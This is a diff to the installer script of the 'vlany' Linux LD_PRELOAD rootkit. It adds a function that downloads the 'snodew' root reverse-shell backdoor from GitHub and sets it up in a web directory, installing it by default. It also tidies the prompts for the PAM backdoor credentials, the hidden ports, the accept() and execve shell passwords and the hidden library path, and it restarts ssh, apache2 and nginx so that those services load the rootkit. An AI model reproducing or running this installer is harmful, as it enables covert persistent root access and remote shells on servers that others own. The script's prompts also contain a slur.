@@ -72,6 +72,35 @@ patch_dynamic_linker ()
     rm new_preload
 }
 
+install_snodew ()
+{
+    MAGIC_GID=$(cat magic_gid) && rm magic_gid
+
+    wget https://github.com/mempodippy/snodew/archive/master.tar.gz && tar xvpfz master.tar.gz
+    rm master.tar.gz || { echo "Error: master.tar.gz doesn't exist. Exiting."; exit; }
+
+    if [ "$INSTALLING_IN_CLI" == "1" ]; then
+        read -p "Snodew installation directory [/var/www/html]: "
+        [ -z $REPLY ] && SNODEW_INSTALL="/var/www/html";
+        [ ! -z $REPLY ] && SNODEW_INSTALL="$REPLY";
+        [ ! -d "$SNODEW_INSTALL" ] && { echo "Error: Directory doesn't exist, skipping snodew installation."; return; }
+
+        read -p "Snodew password: "
+        [ -z $REPLY ] && { echo "Error: Password can't be empty, skipping snodew installation."; return; }
+        [ ! -z $REPLY ] && SNODEW_PASSWORD="$REPLY";
+    else
+        SNODEW_INSTALL="/var/www/html"
+        SNODEW_INSTALL=$(dialog --title "$TITLE" --inputbox "\nSnodew installation directory" 9 50 "$SNODEW_INSTALL" 3>&1 1>&2 2>&3)
+        [ ! -d "$SNODEW_INSTALL" ] && { dialog --title "$TITLE" --infobox "Directory doesn't exist, skipping snodew installation." 3 50 3>&1 1>&2 2>&3; return; }
+
+        SNODEW_PASSWORD=$(dialog --title "$TITLE" --passwordbox "\nSnodew password" 9 50 3>&1 1>&2 2>&3)
+        [ -z $SNODEW_PASSWORD ] && { dialog --title "$TITLE" --infobox "Password can't be empty, skipping snodew installation." 3 50 3>&1 1>&2 2>&3; return; }
+    fi
+
+    cd snodew-master/
+    ./setup.sh $SNODEW_INSTALL $SNODEW_PASSWORD $HIDDEN_XATTR_1_STR $MAGIC_GID || { echo "Error: Couldn't run setup script, skipping snodew installation."; return; }
+}
+
 install_vlany_prerequisites ()
 {
     if [ -f /usr/bin/yum ]; then
@@ -123,24 +152,16 @@ get_vlany_settings ()
 {
     if [ "$INSTALLING_IN_CLI" == "1" ]; then
         read -p "PAM backdoor username: "
-        if [ -z $REPLY ]; then
-            echo "LOLOL JUST KIDDING RETARD"
-            exit
-        fi
+        [ -z $REPLY ] && { echo "LOLOL JUST KIDDING RETARD"; exit; }
         V_USER=$REPLY
 
         read -p "PAM backdoor password: "
-        if [ -z $REPLY ]; then
-            echo "LOLOL JUST KIDDING RETARD"
-            exit
-        fi
+        [ -z $REPLY ] && { echo "LOLOL JUST KIDDING RETARD"; exit; }
         V_PASS=$REPLY
 
         PAM_PORT="$(cat /dev/urandom | tr -dc '1-9' | fold -w 4 | head -n 1)"
         read -p "Hidden PAM port [$PAM_PORT]: "
-        if [ ! -z $REPLY ]; then
-            PAM_PORT=$REPLY
-        fi
+        [ ! -z $REPLY ] && PAM_PORT=$REPLY;
 
         read -p "Optional SSL encryption for accept() hook backdoor (Yes/No) [No]: "
         if [ -z $REPLY ]; then
@@ -155,49 +176,34 @@ get_vlany_settings ()
         fi
 
         read -p "accept() shell password: "
-        if [ -z $REPLY ]; then
-            echo "LOLOL JUST KIDDING RETARD"
-            exit
-        fi
+        [ -z $REPLY ] && { echo "LOLOL JUST KIDDING RETARD"; exit; }
         ACCEPT_SHELL_PASSWORD=$REPLY
 
         LOW_PORT="$(cat /dev/urandom | tr -dc '1-9' | fold -w 3 | head -n 1)"
         read -p "accept() low port [$LOW_PORT]: "
-        if [ ! -z $REPLY ]; then
-            LOW_PORT=$REPLY
-        fi
+        [ ! -z $REPLY ] && LOW_PORT=$REPLY;
 
         HIGH_PORT="$(($LOW_PORT + $(cat /dev/urandom | tr -dc '2-5' | fold -w 1 | head -n 1)))"
         read -p "accept() high port [$HIGH_PORT]: "
-        if [ ! -z $REPLY ]; then
-            HIGH_PORT=$REPLY
-        fi
+        [ ! -z $REPLY ] && HIGH_PORT=$REPLY;
 
         read -p "execve command password: "
-        if [ -z $REPLY ]; then
-            echo "LOLOL JUST KIDDING RETARD"
-            exit
-        fi
+        [ -z $REPLY ] && { echo "LOLOL JUST KIDDING RETARD"; exit; }
         EXECVE_PASS=$REPLY
 
         OBJECT_FILE_NAME="$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 12 | head -n 1)"
         read -p "Rootkit library name [$OBJECT_FILE_NAME]: "
-        if [ ! -z $REPLY ]; then
-            OBJECT_FILE_NAME=$REPLY
-        fi
+        [ ! -z $REPLY ] && OBJECT_FILE_NAME=$REPLY;
 
         INSTALL="/lib/libc.so.$V_USER.$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)"
         read -p "Hidden directory [$INSTALL]: "
-        if [ ! -z $REPLY ]; then
-            INSTALL=$REPLY
-        fi
+        [ ! -z $REPLY ] && INSTALL=$REPLY;
 
         ENV_VAR="$(cat /dev/urandom | tr -dc 'A-Z' | fold -w 12 | head -n 1)"
         read -p "Environment variable [$ENV_VAR]: "
-        if [ ! -z $REPLY ]; then
-            ENV_VAR=$REPLY
-        fi
+        [ ! -z $REPLY ] && ENV_VAR=$REPLY;
     else
+        # i could add checks to see if input is empty but lazy
         V_USER=$(dialog --title "$TITLE" --inputbox "\nPAM backdoor username" 9 50 3>&1 1>&2 2>&3)
         V_PASS=$(dialog --title "$TITLE" --passwordbox "\nPAM backdoor password" 9 50 3>&1 1>&2 2>&3)
 
@@ -205,8 +211,8 @@ get_vlany_settings ()
         PAM_PORT=$(dialog --title "$TITLE" --inputbox "\nHidden PAM port" 9 50 "$PAM_PORT" 3>&1 1>&2 2>&3)
 
         SSL_STATUS=$(dialog --title "$TITLE" --menu "Optional SSL encryption for accept() hook backdoor" 10 82 5 "No" "Disables SSL encryption in the accept backdoor" "Yes" "Enables SSL encryption, but requires an SSL enabled backdoor listener" 3>&1 1>&2 2>&3)
-        [ "$SSL_STATUS" == "No" ] && { SSL_STATUS=0; }
-        [ "$SSL_STATUS" == "Yes" ] && { SSL_STATUS=1; }
+        [ "$SSL_STATUS" == "No" ] && SSL_STATUS=0;
+        [ "$SSL_STATUS" == "Yes" ] && SSL_STATUS=1;
 
         ACCEPT_SHELL_PASSWORD=$(dialog --title "$TITLE" --passwordbox "\naccept() shell password" 9 50 3>&1 1>&2 2>&3)
         LOW_PORT="$(cat /dev/urandom | tr -dc '1-9' | fold -w 3 | head -n 1)"
@@ -412,8 +418,26 @@ else
     [ "$AUTO_RM" == "Yes" ] && { rm -rf `pwd`; }
 fi
 
-[ -f "/etc/init.d/ssh" ] && { /etc/init.d/ssh restart &>/dev/null; }
+# processes won't be infected with vlany until they are restarted and load our library
+echo "Attempting to restart the ssh and apache2/nginx services. You may have to do this manually after installation."
+[ -f "/etc/init.d/ssh" ] && { echo "Restarting sshd"; /etc/init.d/ssh restart &>/dev/null; }
+[ -f "/etc/init.d/apache2" ] && { echo "Restarting apache2"; /etc/init.d/apache2 restart &>/dev/null; }
+[ -f "/etc/init.d/nginx" ] && { echo "Restarting nginx"; /etc/init.d/nginx restart &>/dev/null; }
+
+read -p "Installation has finished. Would you like to setup the snodew root reverse shell backdoor? (YES/NO) (case-sensitive) [YES]: "
+if [ -z $REPLY ]; then
+    install_snodew
+elif [ "$REPLY" == "YES" ]; then
+    install_snodew
+elif [ "$REPLY" == "NO" ]; then
+    echo "Not installing snodew."
+else
+    echo "Invalid option. Assuming yes."
+    install_snodew
+fi
+
 clear
 cat $INSTALL/.vlany_information
-echo "Thank you for choosing vlany."
+echo "Installation finished."
+echo "If you installed snodew, look in the directory you specified for the filename of the backdoor."
 exit
